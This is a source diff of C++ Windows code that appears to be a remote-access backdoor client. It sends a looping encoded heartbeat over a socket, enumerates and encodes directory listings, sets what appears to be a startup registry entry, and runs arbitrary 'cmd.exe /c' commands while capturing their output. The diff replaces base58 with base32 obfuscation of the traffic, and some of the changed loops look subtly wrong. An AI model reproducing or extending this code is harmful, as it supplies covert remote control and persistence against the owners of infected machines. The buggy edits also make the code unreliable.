@@ -118,104 +118,69 @@ bool TcharToChar(const TCHAR* tchar, char* _char)
 
 bool HeartBeat(SOCKET fd)
 {
-	char buf[BUFSIZ] = "keep alive";
+	char buf[20] = "Alive";
 	encode(buf);
 	while (true)
 	{
-		send(fd, buf, BUFSIZ, 0);
+		send(fd, buf, 20, 0);
 		//cout << buf << endl;
-		Sleep(5000);
+		Sleep(10000);
 	}
 	return false;
 }
 
-void base58encode(char plainText[])
-{
-	int i;
-	long long sum = 0;
-	int len = strlen(plainText) * 138 / 100 + 1;// len * log(2)256 / log(2)(58) + 1
-	char base58Table[59] = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
-	char* encryption = (char*)malloc(len * sizeof(char));
-	int index = 0;
-	memset(encryption, 0, len * sizeof(char));
-	while (index < strlen(plainText)) {
-		int each = plainText[index];
-		for (i = len - 1; ; i--) {
-			each += encryption[i] * 256;
-			encryption[i] = each % 58;
-			each /= 58;
-			if (0 == each)
-				break;
+void base32encode(char* str, uint64_t len) {
+	uint64_t length = CEIL_POS(len * 8 / 5) + 1;
+	char* base32Chars = (char*)malloc(sizeof(char) * length);
+	uint64_t idx = 0;
+
+	for (uint64_t i = 0; i < len; i += 5) {
+		uint64_t byte1 = (uint8_t)str[i];
+		uint64_t byte2 = (i + 1 < len) ? (uint8_t)str[i + 1] : 0;
+		uint32_t byte3 = (i + 2 < len) ? (uint8_t)str[i + 2] : 0;
+		uint16_t byte4 = (i + 3 < len) ? (uint8_t)str[i + 3] : 0;
+		uint8_t byte5 = (i + 4 < len) ? (uint8_t)str[i + 4] : 0;
+
+		uint64_t quintuple = (byte1 << 32) | (byte2 << 24) | (byte3 << 16) | (byte4 << 8) | byte5;
+
+		for (uint64_t j = 0; (j < 8) && (i + j * 0.625 < len); j++) {
+			base32Chars[idx] = BASE32_MAP[(quintuple >> (5 * (7 - j))) & 0x1f];
+			idx++;
 		}
-		i = 0;//输出
-		index++;
 	}
-	i = 0;
-	while (!encryption[i])
-		i++;
-	for (; i <= len - 1; i++)
-	{
-		plainText[i] = base58Table[encryption[i]];
+
+	char paddingChar = BASE32_MAP[32];
+	if (paddingChar) {
+		while (idx % 8) {
+			base32Chars[idx] = paddingChar;
+			idx++;
+		}
 	}
+	base32Chars[idx] = 0;
+	strcpy(str, base32Chars);
 }
 
-bool base58decode(unsigned char* src)  // 解码
-{
-	static char b58n[] =
-	{
-		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
-		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
-		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
-		-1,  0,  1,  2,  3,  4,  5,  6,  7,  8, -1, -1, -1, -1, -1, -1,
-		-1,  9, 10, 11, 12, 13, 14, 15, 16, -1, 17, 18, 19, 20, 21, -1,
-		22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, -1, -1, -1, -1, -1,
-		-1, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, -1, 44, 45, 46,
-		47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, -1, -1, -1, -1, -1,
-		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
-		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
-		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
-		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
-		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
-		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
-		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
-		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
-	};
-	size_t len = strlen((char*)src);
-	size_t rlen = (len / 4 + 1) * 3;
-	unsigned char* ret = (unsigned char*)malloc(rlen);
-	unsigned char* rptr = ret + rlen;
-	size_t i;
-	unsigned char* ptr;
-	for (i = 0; i < len; i++)
-	{
-		char rest = b58n[src[i]];
-		if (rest < 0)
-		{
-			free(ret);
-			return NULL;
+void base32decode(char* base32Str, uint64_t len) {
+	while (base32Str[len - 1] == BASE32_MAP[32]) {
+		len--;
+	}
+	uint64_t length = CEIL_POS(len * 5 / 8) + 1;
+	char* str = (char*)malloc(sizeof(char) * length);
+	uint64_t idx = 0;
+
+	for (uint64_t i = 0; i < len; i += 8) {
+		uint64_t quintuple = 0;
+		for (uint8_t j = 0; j < 8; ++j) {
+			if (i + j < len) quintuple = (quintuple << 5) | ((uint8_t)BASE32_REVERSE_MAP[base32Str[i + j]] & 0x1f);
+			else quintuple = quintuple << 5;
 		}
-		for (ptr = ret + rlen - 1; ptr >= rptr; ptr--)
-		{
-			unsigned int c = rest + *ptr * 58;
-			*ptr = c % 256;
-			rest = c / 256;
-		}
-		if (rest > 0)
-		{
-			rptr--;
-			if (rptr < ret)
-			{
-				free(ret);
-				return NULL;
-			}
-			*rptr = rest;
+		for (uint8_t j = 0; (j < 5); ++j) {
+			str[idx] = (quintuple >> (8 * (4 - j))) & 0xff;
+			idx++;
 		}
 	}
-	for (i = 0; i < ret + rlen - rptr; i++)
-		ret[i] = rptr[i];
-	ret[i] = 0;
-	memcpy(src, ret, strlen((char*)src) + 1);
-	return true;
+	str[idx] = 0;
+	strcpy(base32Str, str);
 }
 
 void base64encode(char* str)
@@ -306,34 +271,23 @@ void base64decode(char* str)
 
 void encode(char* text)
 {
-	base58encode(text);
+	base32encode(text, strlen(text));
 	base64encode(text);
 }
 
 void decode(char* pwd)
 {
 	base64decode(pwd);
-	unsigned char s[BUFSIZ * 2] = { 0 };
-	memcpy(s, pwd, strlen(pwd) + 1);
-	base58decode(s);
-	strcpy(pwd, (char*)s);
+	base32decode(pwd, strlen(pwd));
 }
 
 void GetFileName(char FileName[FileNameRow][FileNameCol], char* str)
 {
-	int i;
-	for (i = 0; i < FileNameRow; i++)//对存储文件名的二维数组初始化
-	{
-		memset(FileName[i], 0, sizeof(FileName[i]));
-	}
+	int i = 0;
 	intptr_t Handle;
 	struct _finddata_t FileInfo;
-	string p;
-	string path = (string)str;
-	//cout << path;
-	Handle = _findfirst(p.assign(path).append("\\*").c_str(), &FileInfo);
-	strcpy(FileName[0], str);//提示
-	i = 1;
+	string path(str);
+	Handle = _findfirst(path.append("\\*").c_str(), &FileInfo);
 	while (_findnext(Handle, &FileInfo) == 0)
 	{
 		strcpy(FileName[i], FileInfo.name);
@@ -341,10 +295,9 @@ void GetFileName(char FileName[FileNameRow][FileNameCol], char* str)
 	}
 	_findclose(Handle);
 	//加密
-	char Zero[FileNameCol] = { 0 };
-	for (int i = 0; i < FileNameRow; i++)
+	for (i = 0; i < FileNameCol; i++)
 	{
-		if (strcmp(FileName[i], Zero) != 0)
+		if (FileName[i][0] != 0)
 		{
 			encode(FileName[i]);
 		}
@@ -379,7 +332,7 @@ int ComputerStart(char* pathName)
 		strlen(pathName)        // 字符串长度
 	);
 
-	if (result != ERROR_SUCCESS) 
+	if (result != ERROR_SUCCESS)
 	{
 		return 0;
 	}
@@ -451,7 +404,7 @@ int cmd(char* cmdStr, char* message)
 	sprintf(command, "cmd.exe /c %s", cmdStr);
 
 	// 创建子进程,运行命令,子进程是可继承的
-	if (!CreateProcess(NULL, (LPWSTR)command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) 
+	if (!CreateProcess(NULL, (LPWSTR)command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
 	{
 		CloseHandle(hRead);
 		CloseHandle(hWrite);
@@ -461,7 +414,7 @@ int cmd(char* cmdStr, char* message)
 	CloseHandle(hWrite);
 
 	//读取管道的read端,获得cmd输出
-	while (ReadFile(hRead, buf, BUFSIZ * 2, &readByte, NULL)) 
+	while (ReadFile(hRead, buf, BUFSIZ * 2, &readByte, NULL))
 	{
 		strcat(message, buf);
 		ZeroMemory(buf, BUFSIZ * 2);
